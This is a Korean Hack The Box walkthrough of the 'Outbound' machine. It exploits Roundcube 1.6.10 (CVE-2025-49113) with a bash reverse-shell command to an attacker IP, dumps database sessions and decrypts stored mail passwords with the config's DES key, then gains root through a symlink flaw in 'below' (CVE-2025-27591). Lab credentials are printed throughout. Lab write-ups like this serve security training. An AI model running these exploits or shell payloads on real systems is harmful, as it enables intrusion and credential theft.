# HTB-OUTBOUND
```bash
OS: Linux
DATE: 26.11.09
DIFFICULTY: Easy
```

## RECON
머신을 풀기 전 먼저 크레덴셜 하나를 얻고 시작하였다. tyler / LhKL1o9Nm3X2
**nmap**: 초기 전체 포트 검사와 상세 포트 검사를 진행하였다.
```bash
nmap -p- -T4 IP | grep -oP '^\d+/tcp' | cut -d/ -f1 | paste -sd,
```
```bash
nmap -sC -sV -p 22,80 IP
```
검사 결과 80(HTTP), 22(SSH) 서비스가 동작 중이었다. 따라서 바로 HTTP 서비스에 접속해 본 결과 `mail.outbound.htb` 도메인으로 리다이렉트되어, /etc/hosts에 도메인을 추가해 주었다.
```bash
sudo nano /etc/hosts
```

## Initial Access
초기 정찰 후 HTTP에서 초기에 받은 크레덴셜로 로그인해 보았다. 로그인 결과 대상 시스템이 `Roundcube Webmail`이라는 메일 서비스라는 것을 알게 되었다. 또한 about 창에서 **Roundcube Webmail 1.6.10** 버전인 것도 알게 되었다. 따라서 대상 버전에 취약점이 있는지 찾아보았다. 찾아본 결과 **CVE-2025-49113**이라는 인증 RCE 취약점이 있다는 것을 알게 되었다. 따라서 [PoC](https://github.com/AC8999/CVE-2025-49113/blob/main/exploit.py)를 다운로드 받고 실행해 보았다.
```bash
python exploit.py http://mail.outbound.htb tyler LhKL1o9Nm3X2 "bash -c 'exec bash -i &>/dev/tcp/IP/4444 <&1'"
```
```bash
rlwrap nc -nlvp 4444

$
```
이렇게 리버스 쉘을 실행해 본 결과 초기 www-data 계정의 쉘을 얻게 되었다. 실행 후 `/var/www` 디렉터리에 들어가 열거를 진행해 보았다. 열거 결과 `/var/www/html/roundcube/config` 폴더 안의 config.inc.php 파일을 통해 DB 접속 정보를 알게 되었다.
```php
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';

// IMAP host chosen to perform the log-in.
// See defaults.inc.php for the option description.
$config['imap_host'] = 'localhost:143';

// SMTP server host (for sending mails).
// See defaults.inc.php for the option description.
$config['smtp_host'] = 'localhost:587';

// SMTP username (if required) if you use %u as the username Roundcube
// will use the current username for login
$config['smtp_user'] = '%u';

// SMTP password (if required) if you use %p as the password Roundcube
// will use the current user's password for login
$config['smtp_pass'] = '%p';

// provide an URL where a user can get support for this Roundcube installation
// PLEASE DO NOT LINK TO THE ROUNDCUBE.NET WEBSITE HERE!
$config['support_url'] = '';

// Name your service. This is displayed on the login screen and in the window title
$config['product_name'] = 'Roundcube Webmail';

// This key is used to encrypt the users imap password which is stored
// in the session record. For the default cipher method it must be
// exactly 24 characters long.
// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';
```
따라서 mysql 명령어로 접속해 보았다.
```bash
mysql -u roundcube -p'RCDBPass2025' roundcube
```
하지만 무슨 이유에서인지 대화형으로는 불가능한 것 같았다. 따라서 -e 옵션을 사용하여 쿼리를 명령어에서 직접 입력하였다.
```bash
mysql -u roundcube -p'RCDBPass2025' roundcube -e 'SELECT @@version;' 
```
그 결과 DB 조회가 가능하였다. 따라서 테이블을 출력해 보았다.
```bash
mysql -u roundcube -p'RCDBPass2025' roundcube -e 'SHOW TABLES;'

Tables_in_roundcube
cache
cache_index
cache_messages
cache_shared
cache_thread
collected_addresses
contactgroupmembers
contactgroups
contacts
dictionary
filestore
identities
responses
searches
session
system
users
```
그 결과 여러 테이블이 나왔다. 먼저 users라는 테이블을 출력해 보았다.
```bash
mysql -u roundcube -p'RCDBPass2025' roundcube -e 'SELECT * FROM users;'

user_id username        mail_host       created last_login      failed_login    failed_login_counter    language        preferences
1       jacob   localhost       2025-06-07 13:55:18     2026-11-09 05:48:07     2025-06-11 07:51:32     1       en_US   a:1:{s:11:"client_hash";s:16:"hpLLqLwmqbyihpi7";}
2       mel     localhost       2025-06-08 12:04:51     2025-06-08 13:29:05     NULL    NULL    en_US   a:1:{s:11:"client_hash";s:16:"GCrPGMkZvbsnc3xv";}
3       tyler   localhost       2025-06-08 13:28:55     2026-11-09 06:52:06     2025-06-11 07:51:22     1       en_US   a:1:{s:11:"client_hash";s:16:"Y2Rz3HTwxwLJHevI";}
```
그 결과 여러 유저의 정보가 나왔지만 중요한 정보를 얻지는 못하였다. 따라서 다른 테이블도 조회해 보았다. 그중 **session**이라는 테이블을 조회해 보았다.
```bash
mysql -u roundcube -p'RCDBPass2025' roundcube -e 'SELECT * FROM session;'

sess_id changed ip      vars
5etoe7elik3bn1nnp7ig2n3ll4      2026-11-09 06:59:39     172.17.0.1      bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjM7dXNlcm5hbWV8czo1OiJ0eWxlciI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ik5JdHA3ZDM3QmZER2txQUVpSHZEWGVSYkFrdnVXa3A1Ijtsb2dpbl90aW1lfGk6MTc5NDIwNzU3ODt0aW1lem9uZXxzOjEwOiJBc2lhL1Nlb3VsIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJVZU9pQnQzdnlReG1YcHlsUUNxT1BwdXFIVCI7cmVxdWVzdF90b2tlbnxzOjMyOiJmYVl5a2F6b2ZDTmZpcEZ3TVBsN2ZkanR3aHoxeHd1dCI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjA7czo0OiJTZW50IjtpOjA7fQ==
6a5ktqih5uca6lj8vrmgh9v0oh      2025-06-08 15:46:40     172.17.0.1      bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7
```
여러 session_id와 vars라는 컬럼도 조회가 가능하였다. 먼저 가장 최근에 찍힌 sess_id로 브라우저 접속을 시도해 보았다. 하지만 불가능하였다. 따라서 vars의, base64로 인코딩되어 보이는 문자열을 디코딩해 보았다.
```bash
echo "bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjM7dXNlcm5hbWV8czo1OiJ0eWxlciI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ik5JdHA3ZDM3QmZER2txQUVpSHZEWGVSYkFrdnVXa3A1Ijtsb2dpbl90aW1lfGk6MTc5NDIwNzU3ODt0aW1lem9uZXxzOjEwOiJBc2lhL1Nlb3VsIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJVZU9pQnQzdnlReG1YcHlsUUNxT1BwdXFIVCI7cmVxdWVzdF90b2tlbnxzOjMyOiJmYVl5a2F6b2ZDTmZpcEZ3TVBsN2ZkanR3aHoxeHd1dCI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjA7czo0OiJTZW50IjtpOjA7fQ==" | base64 -d

language|s:5:"en_US";imap_namespace|a:4:{s:8:"personal";a:1:{i:0;a:2:{i:0;s:0:"";i:1;s:1:"/";}}s:5:"other";N;s:6:"shared";N;s:10:"prefix_out";s:0:"";}imap_delimiter|s:1:"/";imap_list_conf|a:2:{i:0;N;i:1;a:0:{}}user_id|i:3;username|s:5:"tyler";storage_host|s:9:"localhost";storage_port|i:143;storage_ssl|b:0;password|s:32:"NItp7d37BfDGkqAEiHvDXeRbAkvuWkp5";login_time|i:1794207578;timezone|s:10:"Asia/Seoul";STORAGE_SPECIAL-USE|b:1;auth_secret|s:26:"UeOiBt3vyQxmXpylQCqOPpuqHT";request_token|s:32:"faYykazofCNfipFwMPl7fdjtwhz1xwut";task|s:4:"mail";skin_config|a:7:{s:17:"supported_layouts";a:1:{i:0;s:10:"widescreen";}s:22:"jquery_ui_colors_theme";s:9:"bootstrap";s:18:"embed_css_location";s:17:"/styles/embed.css";s:19:"editor_css_location";s:17:"/styles/embed.css";s:17:"dark_mode_support";b:1;s:26:"media_browser_css_location";s:4:"none";s:21:"additional_logo_types";a:3:{i:0;s:4:"dark";i:1;s:5:"small";i:2;s:10:"small-dark";}}imap_host|s:9:"localhost";page|i:1;mbox|s:5:"INBOX";sort_col|s:0:"";sort_order|s:4:"DESC";STORAGE_THREAD|a:3:{i:0;s:10:"REFERENCES";i:1;s:4:"REFS";i:2;s:14:"ORDEREDSUBJECT";}STORAGE_QUOTA|b:0;STORAGE_LIST-EXTENDED|b:1;list_attrib|a:6:{s:4:"name";s:8:"messages";s:2:"id";s:11:"messagelist";s:5:"class";s:42:"listing messagelist sortheader fixedheader";s:15:"aria-labelledby";s:22:"aria-label-messagelist";s:9:"data-list";s:12:"message_list";s:14:"data-label-msg";s:18:"The list is empty.";}unseen_count|a:2:{s:5:"INBOX";i:0;s:4:"Sent";i:0;}
```
확인 결과 password라고 써 있는 `password|s:32:"NItp7d37BfDGkqAEiHvDXeRbAkvuWkp5"`라는, 암호화되어 보이는 문자열을 발견할 수 있었다. 이 암호화된 것을 복호화하기 위해 찾아보았다. 찾아본 결과 [Roundcube Password Decoder](https://keydecryptor.com/decryption-tools/roundcube)라는 대상 시스템 전용 복호화 도구를 찾게 되었다. 이 문자열을 복호화하려면 키가 필요하기에 찾아보았다. 아까 `/var/www/html/roundcube/config`에서 출력했던 `$config['des_key'] = 'rcmail-!24ByteDESkey*Str';` 키를 발견할 수 있어 복호화를 진행해 보았다.

![1](attach_real/Pasted%20image%2020261109160702.png)

확인해 본 결과 이 비밀번호는 초기에 받았던 tyler 유저의 비밀번호라는 것을 알게 되었다. 따라서 다시 한번 session 테이블에서 다른 base64 문자열을 디코딩해 보았다.
```bash
echo "bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7" | base64 -d

language|s:5:"en_US";imap_namespace|a:4:{s:8:"personal";a:1:{i:0;a:2:{i:0;s:0:"";i:1;s:1:"/";}}s:5:"other";N;s:6:"shared";N;s:10:"prefix_out";s:0:"";}imap_delimiter|s:1:"/";imap_list_conf|a:2:{i:0;N;i:1;a:0:{}}user_id|i:1;username|s:5:"jacob";storage_host|s:9:"localhost";storage_port|i:143;storage_ssl|b:0;password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";login_time|i:1749397119;timezone|s:13:"Europe/London";STORAGE_SPECIAL-USE|b:1;auth_secret|s:26:"DpYqv6maI9HxDL5GhcCd8JaQQW";request_token|s:32:"TIsOaABA1zHSXZOBpH6up5XFyayNRHaw";task|s:4:"mail";skin_config|a:7:{s:17:"supported_layouts";a:1:{i:0;s:10:"widescreen";}s:22:"jquery_ui_colors_theme";s:9:"bootstrap";s:18:"embed_css_location";s:17:"/styles/embed.css";s:19:"editor_css_location";s:17:"/styles/embed.css";s:17:"dark_mode_support";b:1;s:26:"media_browser_css_location";s:4:"none";s:21:"additional_logo_types";a:3:{i:0;s:4:"dark";i:1;s:5:"small";i:2;s:10:"small-dark";}}imap_host|s:9:"localhost";page|i:1;mbox|s:5:"INBOX";sort_col|s:0:"";sort_order|s:4:"DESC";STORAGE_THREAD|a:3:{i:0;s:10:"REFERENCES";i:1;s:4:"REFS";i:2;s:14:"ORDEREDSUBJECT";}STORAGE_QUOTA|b:0;STORAGE_LIST-EXTENDED|b:1;list_attrib|a:6:{s:4:"name";s:8:"messages";s:2:"id";s:11:"messagelist";s:5:"class";s:42:"listing messagelist sortheader fixedheader";s:15:"aria-labelledby";s:22:"aria-label-messagelist";s:9:"data-list";s:12:"message_list";s:14:"data-label-msg";s:18:"The list is empty.";}unseen_count|a:2:{s:5:"INBOX";i:2;s:5:"Trash";i:0;}folders|a:1:{s:5:"INBOX";a:2:{s:3:"cnt";i:2;s:6:"maxuid";i:3;}}list_mod_seq|s:2:"10";
```
그 결과 새로운 암호화된 비밀번호 문자열을 얻게 되어 마찬가지로 복호화를 진행하였다.

![2](attach_real/Pasted%20image%2020261109161045.png)

그 결과 새로운 비밀번호를 얻을 수 있었다. 이 비밀번호가 맞는 ssh 유저가 있는지 nxc 도구를 사용하여 확인해 주었다.
```bash
nxc ssh -u user -p 595mO8DmwGeD 
```
그 결과 jacob이라는 유저의 ssh 계정을 얻게 되었고, ssh에 접속하여 user 플래그를 얻을 수 있었다.

![user](attach_real/Pasted%20image%2020261109145622.png)

## Privilege Escalation
쉘에 접속하여 가장 먼저 sudo -l을 확인하여 root 권한으로 무엇을 할 수 있는지 찾아보았다.
```bash
sudo -l 

(ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
```
확인 결과 root 권한으로 below라는 도구를 사용할 수 있었다. 따라서 대상 도구로 권한 상승이 가능한지 찾아보았다. 찾아본 결과 **CVE-2025-27591**이라는 취약점이 있다는 것을 알게 되었다. 대상 취약점은 /var/log/below 로그 디렉터리를 전역 쓰기 가능하게 만들어버려서, 일반 사용자가 심볼릭 링크 공격으로 root 권한을 얻게 하는 취약점이었다. 따라서 [PoC](https://github.com/BridgerAlderson/CVE-2025-27591-PoC)를 다운로드 받고 권한 상승을 진행해 보았다. 먼저 이 공격이 가능한지 확인해 보았다.
```bash
ls -lh /var/log/ | grep below                                                                                                                                                                                                                                          
drwxrwxrwx  3 root      root            4.0K Jul 14  2025 below
```
그 결과 대상 디렉터리가 수정을 포함한 모든 것이 가능하여 PoC 코드를 실행하였다.
```bash
python exploit.py

#
```
그 결과 root 권한을 얻을 수 있었다.

![root](attach_real/Pasted%20image%2020261109145601.png)


## New Inform
- DB의 중요한 내용이 users에만 있다고 생각하지 말고 모든 테이블을 조회해 보자
- session 테이블을 볼 때 "브라우저 세션이구나"라고 알아채자
- 보기 편하게 줄바꿈해 주는 명령어를 사용하여 더 편하게 읽어보자. `| tr ';' '\n'`
- 항상 암호화를 염두에 두자
- 대상 시스템의 암호화 방법을 찾아보고 복호화 도구를 찾아보자
- GTFOBins에 없더라도 exploit이 가능할 수 있다